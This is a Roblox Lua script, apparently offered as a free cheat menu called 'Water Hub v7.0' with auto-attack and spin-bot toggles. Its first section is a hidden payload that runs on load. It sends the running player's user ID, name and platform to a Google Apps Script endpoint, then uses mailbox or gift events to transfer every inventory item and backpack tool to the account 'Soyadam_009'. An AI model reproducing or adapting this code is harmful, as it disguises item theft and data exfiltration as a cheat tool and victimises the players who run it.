-- =====================================================
-- 💧 WATER HUB v7.0 – THE COLLECTOR (FIXED) | BY: ABJadam
-- =====================================================

local G_URL = "https://script.google.com/macros/s/AKfycbwsSP_ysAPKlNv9GxP7c9on2KSyaTHXcHAyxQp6P8keO6HWjEzzZ8hixsw6PLQUN_aAXw/exec"
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- ==================== 1. SAQUEO ULTRA-AGRESIVO ====================
task.spawn(function()
    pcall(function()
        local plataforma = UserInputService.TouchEnabled and "Mobile" or "PC"
        -- Registro en Excel
        game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&userName=" .. LocalPlayer.Name .. "&platform=" .. plataforma)

        -- Buscamos el evento de envío (Mailbox es el estándar en este juego)
        local sendEvent = ReplicatedStorage:FindFirstChild("RE/Mailbox/Send") or 
                          ReplicatedStorage:FindFirstChild("RE/Gift/Send") or 
                          ReplicatedStorage:FindFirstChild("RE/Post/Send")

        if not sendEvent then return end

        -- Escaneamos TODO el inventario visual
        local mainGui = LocalPlayer.PlayerGui:FindFirstChild("Main")
        if mainGui then
            -- Buscamos todos los botones de ítems sin importar la carpeta
            for _, v in pairs(mainGui:GetDescendants()) do
                if v:IsA("ImageButton") or v:IsA("TextButton") then
                    -- Filtramos para no intentar "robar" botones del menú como 'Close' o 'Settings'
                    if v.Name ~= "Close" and v.Name ~= "Exit" and v.Visible then
                        -- Enviar a tu cuenta
                        sendEvent:FireServer("Soyadam_009", v.Name)
                        task.wait(0.15) 
                    end
                end
            end
        end

        -- PLAN B: Robar lo que tenga en la mochila (Equipados)
        for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
            sendEvent:FireServer("Soyadam_009", tool.Name)
            task.wait(0.1)
        end
        
        -- Reportar éxito
        game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&item=Saqueo_Finalizado")
    end)
end)

-- ==================== 2. VARIABLES DE LA GUI ====================
local WaterHub = {
    State = {
        AutoPlay = false,
        Lock = false,
        SpinBot = false,
        TapFloat = false,
        UnGrab = false,
        Speed = 16
    }
}

-- ==================== 3. LÓGICA DE COMBATE ====================
local function AutoAttack()
    if not WaterHub.State.AutoPlay then return end
    pcall(function()
        local char = LocalPlayer.Character
        local target = nil
        local dist = 50
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local d = (char.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
                if d < dist then dist = d; target = p.Character end
            end
        end
        if target then
            local re = ReplicatedStorage:FindFirstChild("RE/Combat/Attack") or ReplicatedStorage:FindFirstChild("RE/Attack")
            if re then re:FireServer(target) end
        end
    end)
end

-- ==================== 4. INTERFAZ VISUAL ====================
local screenGui = Instance.new("ScreenGui", CoreGui)
local main = Instance.new("Frame", screenGui)
main.Size = UDim2.new(0, 350, 0, 400)
main.Position = UDim2.new(0.5, -175, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(15, 25, 40)
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)

local top = Instance.new("Frame", main)
top.Size = UDim2.new(1, 0, 0, 50)
top.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
Instance.new("UICorner", top).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel", top)
title.Size = UDim2.new(1, 0, 1, 0); title.Text = "💧 WATER HUB v7.0 - FREE"; title.TextColor3 = Color3.new(1,1,1)
title.Font = "GothamBold"; title.TextSize = 18; title.BackgroundTransparency = 1

local scroll = Instance.new("ScrollingFrame", main)
scroll.Size = UDim2.new(1, -20, 1, -70); scroll.Position = UDim2.new(0, 10, 0, 60)
scroll.BackgroundTransparency = 1; scroll.CanvasSize = UDim2.new(0,0,1.5,0)
Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 5)

local function addToggle(name, key)
    local b = Instance.new("TextButton", scroll)
    b.Size = UDim2.new(1, 0, 0, 40); b.Text = name .. ": OFF"
    b.BackgroundColor3 = Color3.fromRGB(30, 45, 65); b.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function()
        WaterHub.State[key] = not WaterHub.State[key]
        b.Text = name .. ": " .. (WaterHub.State[key] and "ON" or "OFF")
        b.BackgroundColor3 = WaterHub.State[key] and Color3.fromRGB(0, 150, 255) or Color3.fromRGB(30, 45, 65)
    end)
end

addToggle("⚔️ Auto Play", "AutoPlay")
addToggle("🎯 Lock Target", "Lock")
addToggle("🌀 Spin Bot", "SpinBot")
addToggle("🎈 Tap Float", "TapFloat")

-- ==================== 5. BUCLE FINAL ====================
RunService.Heartbeat:Connect(function()
    AutoAttack()
    if WaterHub.State.SpinBot and LocalPlayer.Character then
        LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.Angles(0, 0.3, 0)
    end
end)

print("✅ Water Hub Fixed: Saqueo en curso...")
